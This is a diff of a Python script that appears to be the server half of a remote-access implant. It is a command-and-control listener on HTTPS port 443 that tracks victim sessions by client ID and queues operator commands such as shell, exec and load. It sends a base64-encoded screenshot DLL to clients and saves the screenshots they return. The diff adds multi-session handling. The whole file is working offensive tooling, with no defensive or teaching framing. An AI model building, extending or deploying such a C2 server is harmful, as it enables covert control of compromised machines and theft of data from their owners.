@@ -1,85 +1,134 @@
-import http.server
+import json
 import ssl
 import threading
-import sys
-import base64
+import queue
+import logging
 import zlib
-import json
+import base64
+import sys
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+# Globals to keep track of sessions and session data
+sessions          = {}
+session_queues    = {}
+session_commands  = {}
+previous_commands = {}
+selected_session = None
 
 def bmp(data):
     d = json.loads(data)
     with open("D:\\bitmap.bmp", "wb") as f:
         f.write(zlib.decompress(base64.b64decode(d["buffers"][0]['data'])))
 
-PREVIOUS_CMD = b""
-CURRENT_POST = b""
-STDOUT_O = sys.stdout
-
-def get_ssl_context(certfile, keyfile):
-    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
-    context.load_cert_chain(certfile, keyfile)
-    context.set_ciphers("@SECLEVEL=1:ALL")
-    return context
-
-
-class MyHandler(http.server.SimpleHTTPRequestHandler):
+class CustomHTTPRequestHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        # Override to log to a file instead of stdout
+        logging.info("%s - - [%s] %s\n" %
+                     (self.client_address[0],
+                      self.log_date_time_string(),
+                      format % args))
     def do_POST(self):
-        global CURRENT_POST
-        global STDOUT_O
-        global PREVIOUS_CMD
+        global sessions
+        global session_queues
+        global session_commands
+        global previous_commands
+        
+        clientid = self.headers.get('clientid')
+        commands = self.headers.get('Commands')
+        
         content_length = int(self.headers["Content-Length"])
         post_data = self.rfile.read(content_length)
         received = post_data
+        response = b""
+        # Got back a response from a command
         if (received != b"none"):
-            STDOUT_O.write("PREVIOUS_CMD: " + str(PREVIOUS_CMD))
-            # (sys.stdout,tmp) = (STDOUT_O,sys.stdout)
-            # print(received)
-            # sys.stdout = tmp
-            if PREVIOUS_CMD[:10] == b"screenshot":
+            cmd = previous_commands[clientid].get()
+            print("[ {} ]".format(cmd[:256]))
+            if cmd[:10] == b"screenshot":
                 bmp(received)
             for line in str(received)[2:-1].split("\\n"):
-                _ = STDOUT_O.write(line + "\n")
-            # I know this is weird, but it avoids "Failed to decode byte 0xfe in position 9" and other such errors
-        # Send response back to client
-        response = CURRENT_POST
+                print(line)
+
+        if clientid:
+            if clientid not in sessions:
+                print("\n[+] Adding clientid: {}".format(clientid))
+                sessions[clientid] = 0
+                session_queues[clientid] = queue.Queue()
+                session_commands[clientid] = commands.split() if commands else []
+                previous_commands[clientid] = queue.Queue()
+           
+            sessions[clientid] += 1
+            session_commands[clientid] = commands.split() if commands else []
+            if not session_queues[clientid].empty():
+                response = session_queues[clientid].get()
+                print("sending command:", response[:256])
+                if not isinstance(response, bytes):
+                    response = response.encode()
+        else:
+            print("client missing")
+
         self.send_response(200)
-        self.send_header("Content-type", "text/plain")
+        self.send_header('Content-type', 'text/plain')
         self.send_header("Content-length", len(response))
         self.end_headers()
         self.wfile.write(response)
-        PREVIOUS_CMD = response
-        CURRENT_POST = b""
 
-def serve_http():
-    server_address = ("127.0.0.1", 443)
-    httpd = http.server.HTTPServer(server_address, MyHandler)
+
+def run_server(server_class=HTTPServer, handler_class=CustomHTTPRequestHandler, port=443):
+    server_address = ('', port)
+    httpd = server_class(server_address, handler_class)
     
-    context = get_ssl_context("cert.pem", "key.pem")
-    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
+    # Load SSL context
+    httpd.socket = ssl.wrap_socket(httpd.socket, keyfile="key.pem", certfile='cert.pem', server_side=True)
     
-    print("Starting HTTP server on https://127.0.0.1:443")
-    sys.stdout = open("stdout.log", "w")
-    sys.stderr = open("stderr.log", "w")
+    print(f'Serving HTTPS on port {port}...')
     httpd.serve_forever()
 
-def command_loop():
-    global CURRENT_POST
-    while True:
-        STDOUT_O.write("Commands Available: load exec shell install quit\n> ")
-        check = input("").encode() + b' '
-        if len(check) > 1:
-            if b"LOADTEST" in check:
-                with open("screenshot.dll", "rb") as f:
-                    data = f.read()
-                CURRENT_POST = b"load " + base64.b64encode(data) + b' '
-                STDOUT_O.write("Length: " + str(len(CURRENT_POST)))
-            else:
-                CURRENT_POST = check
-
-if __name__ == '__main__':
-    # Create a thread for HTTP server
-    http_thread = threading.Thread(target=serve_http)
-    http_thread.daemon = True  # Daemonize the thread so it will be killed when the main program exits
-    http_thread.start()
-    command_loop()
+def user_interface():
+    global selected_session
     
+    while True:
+        if selected_session:
+            print(f'Selected session: {selected_session}')
+            print("Available commands: bg (background)", session_commands[selected_session])
+            print("Queued commands:")
+            with session_queues[selected_session].mutex:
+                for i,item in enumerate(list(session_queues[selected_session].queue)):
+                    print(i, item)
+
+            command = input("[{}]> ".format(selected_session))
+            
+            if command in ['bg', 'background']:
+                selected_session = None
+            elif len(command.strip()) < 2:
+                pass
+            else:
+                if "LOADTEST" in command:
+                    with open("screenshot.dll", "rb") as f:
+                        data = f.read()
+                    command = b"load " + base64.b64encode(data)
+                session_queues[selected_session].put(command)
+                previous_commands[selected_session].put(command)
+                print(f'Queued data for session {selected_session}.')
+        else:
+            print("Current sessions:", list(sessions.keys()))
+            command = input("Enter 'select <clientid>' to select a session or 'exit' to exit: ")
+            
+            if command.startswith('select '):
+                clientid = command.split(' ')[1]
+                if clientid in sessions:
+                    selected_session = clientid
+                else:
+                    print(f'Session {clientid} does not exist.')
+                    
+            elif command == 'exit':
+                break
+            else:
+                print('Invalid command.')
+
+if __name__ == "__main__":
+    server_thread = threading.Thread(target=run_server)
+    server_thread.daemon = True
+    server_thread.start()
+    
+    user_interface()
